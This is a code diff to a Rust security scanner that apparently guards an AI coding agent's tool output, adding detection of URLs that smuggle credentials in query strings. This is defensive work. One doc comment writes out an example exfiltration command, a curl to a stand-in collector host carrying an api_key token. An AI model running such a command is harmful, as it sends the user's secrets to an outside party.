@@ -35,11 +35,21 @@
 //! always requires a pattern hit on one of the two passes. Defaults ON with
 //! no config keys this phase (F6 evaluates toggles).
 //!
+//! # URL parameter exfiltration on output surfaces (FASE 5-A, Feature B)
+//!
+//! [`scan_output`] extends the same two-pass scoring with
+//! [`url_exfil::analyze`]: `http(s)://` URLs whose query strings carry
+//! secret-semantics parameter names or credential-shaped values (JWT / hex≥32
+//! / base64-like≥32). Wired into the `BashStdout` surface (PostToolUse,
+//! WARN-only posture); F6 may extend to Read/WebFetch and add domain
+//! allowlisting.
+
 mod djl;
 mod normalize;
 mod owasp;
 pub mod refetch;
 mod two_stage;
+mod url_exfil;
 
 use std::borrow::Cow;
 use std::cell::RefCell;
@@ -205,16 +215,29 @@ impl PreMatch {
 /// Surface-agnostic: it scores text only. Per-surface posture (which surfaces may
 /// BLOCK vs WARN, and out-of-band fetching) lives in [`scan_surface`].
 pub fn scan_content(text: &str, thresholds: &Thresholds) -> Verdict {
-    two_pass_scan(text, thresholds)
+    two_pass_scan(text, false, thresholds)
 }
 
-/// One scoring pass over `text`: max severity across the regex rule set.
-/// `None` = clean.
+/// Scan tool OUTPUT text: [`scan_content`] plus the parametric URL
+/// exfiltration detector ([`url_exfil`]) on both passes.
+///
+/// Output is where leaked credentials surface (`curl
+/// https://collector.test/?api_key=<token>` echoed by a build log), so this
+/// entry point adds query-string analysis: a secret-semantics parameter name,
+/// or a credential-shaped value, raises its own severity and composes with
+/// regex findings by max-severity. Used by the `BashStdout` surface; F6 may
+/// extend it to Read/WebFetch.
+pub fn scan_output(text: &str, thresholds: &Thresholds) -> Verdict {
+    two_pass_scan(text, true, thresholds)
+}
+
+/// One scoring pass over `text`: max severity across the regex rule set (and,
+/// when `include_url_exfil`, the URL parameter detector). `None` = clean.
 ///
 /// Mirrors the original single-pass aggregation: strictly-greater severities
 /// replace the current top (ties keep the first hit), so behavior for raw
 /// scans is byte-identical to pre-FASE-5A.
-fn score_once(text: &str) -> Option<(u8, String)> {
+fn score_once(text: &str, include_url_exfil: bool) -> Option<(u8, String)> {
     let mut top: Option<(u8, String)> = None;
 
     // Single pre-match pass over the direct-regex DJL + OWASP patterns AND the
@@ -239,6 +262,15 @@ fn score_once(text: &str) -> Option<(u8, String)> {
         }
     });
 
+    if include_url_exfil {
+        if let Some(finding) = url_exfil::analyze(text) {
+            let better = top.as_ref().is_none_or(|(sev, _)| finding.severity > *sev);
+            if better {
+                top = Some((finding.severity, finding.reason));
+            }
+        }
+    }
+
     top
 }
 
@@ -258,15 +290,15 @@ fn verdict_from(hit: (u8, String), thresholds: &Thresholds, normalized_match: bo
     }
 }
 
-/// Shared engine behind [`scan_content`]: raw pass first,
+/// Shared engine behind [`scan_content`] / [`scan_output`]: raw pass first,
 /// then — only if clean and normalization changed something — one normalized
 /// rescan tagged `[normalized-match]`.
-fn two_pass_scan(text: &str, thresholds: &Thresholds) -> Verdict {
-    if let Some(hit) = score_once(text) {
+fn two_pass_scan(text: &str, include_url_exfil: bool, thresholds: &Thresholds) -> Verdict {
+    if let Some(hit) = score_once(text, include_url_exfil) {
         return verdict_from(hit, thresholds, false);
     }
     if let Cow::Owned(normalized) = normalize::pipeline(text) {
-        if let Some(hit) = score_once(&normalized) {
+        if let Some(hit) = score_once(&normalized, include_url_exfil) {
             return verdict_from(hit, thresholds, true);
         }
     }
@@ -320,8 +352,9 @@ impl<'a> FirewallInput<'a> {
 ///   also fails closed to [`Tier::Warn`].
 /// - **UserPrompt**: scan the prompt text directly, **WARN-only** — a Block is
 ///   clamped to Warn because exit 2 on `UserPromptSubmit` erases the prompt.
-/// - **BashStdout** (PostToolUse): scan the captured stdout, **WARN-only** —
-///   PostToolUse runs after the tool, so it cannot block.
+/// - **BashStdout** (PostToolUse): scan the captured stdout via [`scan_output`]
+///   (regex rules + URL parameter exfiltration), **WARN-only** — PostToolUse
+///   runs after the tool, so it cannot block.
 pub fn scan_surface(
     surface: Surface,
     payload: &FirewallInput<'_>,
@@ -347,10 +380,18 @@ pub fn scan_surface(
             }
         }
 
-        // WARN-only: scan inline text; clamp any Block down to Warn.
-        Surface::UserPrompt | Surface::BashStdout => {
+        // WARN-only: scan inline text (output surfaces add URL-exfil analysis);
+        // clamp any Block down to Warn. UserPrompt keeps `scan_content`: prompt
+        // text with secret-bearing URLs is WebFetch/WebSearch territory — the
+        // fetch itself gets gated there — and this phase keeps the detector
+        // scoped to tool OUTPUT as specified.
+        Surface::UserPrompt => {
             let text = inline_text(payload, src);
             clamp_to_warn(scan_content(&text, thresholds))
+        }
+        Surface::BashStdout => {
+            let text = inline_text(payload, src);
+            clamp_to_warn(scan_output(&text, thresholds))
         }
     }
 }
